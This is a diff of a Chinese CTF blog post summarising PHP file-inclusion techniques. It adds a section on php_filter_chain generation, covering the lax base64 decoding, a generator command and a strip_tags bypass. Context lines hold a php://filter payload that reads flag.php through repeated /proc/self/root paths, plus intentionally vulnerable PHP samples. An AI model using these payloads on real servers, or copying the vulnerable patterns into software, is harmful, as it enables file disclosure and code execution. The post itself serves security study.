@@ -36,9 +36,12 @@
 <meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-10.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-11.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-12.png">
+<meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-13.png">
+<meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-14.png">
+<meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-15.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-4.png">
 <meta property="article:published_time" content="2022-06-23T01:00:00.000Z">
-<meta property="article:modified_time" content="2024-04-07T08:10:34.931Z">
+<meta property="article:modified_time" content="2024-04-28T07:17:10.863Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="总结">
 <meta property="article:tag" content="文件包含">
@@ -262,7 +265,7 @@
         
         
         
-          120 分钟
+          124 分钟
         
       </span>
     
@@ -324,12 +327,12 @@
 <h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">官网伪协议手册</a></p>
 <h3 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><code>file://</code>用于访问本地文件系统</p>
 <p>使用条件：<code>allow_url_fopen=On/Off、allow_url_include=On/Off</code></p>
-<p><img src="/../../img/summary/file_include-1.png" alt="example"></p>
+<p><img src="/img/summary/file_include-1.png" alt="example"></p>
 <blockquote>
 <p>trick: 可以用localhost代替&#x2F;</p>
 </blockquote>
 <h3 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h3><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>使用条件：<code>allow_url_fopen=On/Off、allow_url_include=On/Off</code></p>
-<p><img src="/../../img/summary/file_include-2.png" alt="example"></p>
+<p><img src="/img/summary/file_include-2.png" alt="example"></p>
 <p><img src="/img/summary/file_include-5.png"></p>
 <h5 id="php-x2F-x2F-filter绕过死亡die"><a href="#php-x2F-x2F-filter绕过死亡die" class="headerlink" title="php:&#x2F;&#x2F;filter绕过死亡die"></a>php:&#x2F;&#x2F;filter绕过死亡die</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
@@ -413,17 +416,27 @@
 <p>payload:<br><code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p>
 <p>路径中的<code>/proc/self/root</code>就表示<code>/</code></p>
 <p>具体分析原理的文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
-<h2 id="Iconv-LFI"><a href="#Iconv-LFI" class="headerlink" title="Iconv LFI"></a>Iconv LFI</h2><blockquote>
-<p>原理：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p>
-</blockquote>
-<p>因为不同的靶机环境有不同的字符集，所以可能会打不通，这时可以先fuzz一下，得到更为通用的字符集构造的POC</p>
+<h2 id="FilterChain-利用"><a href="#FilterChain-利用" class="headerlink" title="FilterChain 利用"></a>FilterChain 利用</h2><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用了PHP Base64 Filter 宽松的解析特性</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//解码的字符串中包含无效字符，那么就会忽略掉那些字符，只对有效字符进行解码</span><br><br>dr0n11       --&gt;  ZHIwbjEx<br>ZH<span class="hljs-meta">&lt;?</span>Iw-bjEx  --&gt;  dr0n11<br></code></pre></td></tr></table></figure>
+
+<p>即使我们在使用其他字符编码时产生了不可见字符，也可以利用 convert.base64-decode 来去掉非法字符，留下我们想要的字符</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为不同的靶机环境有不同的字符集，所以可能会打不通，这时可以先fuzz一下，得到更为通用的字符集构造的POC</p>
 <p><strong><a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></strong></p>
 <p><strong><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">PHP filter chain generator</a></strong></p>
 <p>也可以用来绕过一些限定条件</p>
 <p>例如</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) === False) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;failed to read&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nothing here&#x27;</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><code>python3 php_filter_chain_generator.py --chain &#39;aaa  &#39;</code></p>
+<p><code>python3 php_filter_chain_generator.py --chain &#39;aaa&#39;</code></p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p><code>string.strip_tags</code>过滤器和<code>&lt;</code>搭配使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">(PHP <span class="hljs-number">4</span>, PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>, PHP <span class="hljs-number">8</span>)<br>strip_tags — 从字符串中去除 HTML 和 PHP 标签<br></code></pre></td></tr></table></figure>
+
+<p>当我们使用<code>php_filter_chain_generator</code>生成FilterChain的时候在结尾添加一个&lt;标签</p>
+<p><img src="/img/summary/file_include-13.png"></p>
+<p><img src="/img/summary/file_include-14.png"></p>
+<p>在结尾手动添加一个<code>string.strip_tags</code>，过滤后面的乱字符</p>
+<p><img src="/img/summary/file_include-15.png"></p>
 <h2 id="侧信道读取文件"><a href="#侧信道读取文件" class="headerlink" title="侧信道读取文件"></a>侧信道读取文件</h2><blockquote>
 <p>非常详细的原理解释：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1755">The End of AFR?</a></p>
 </blockquote>
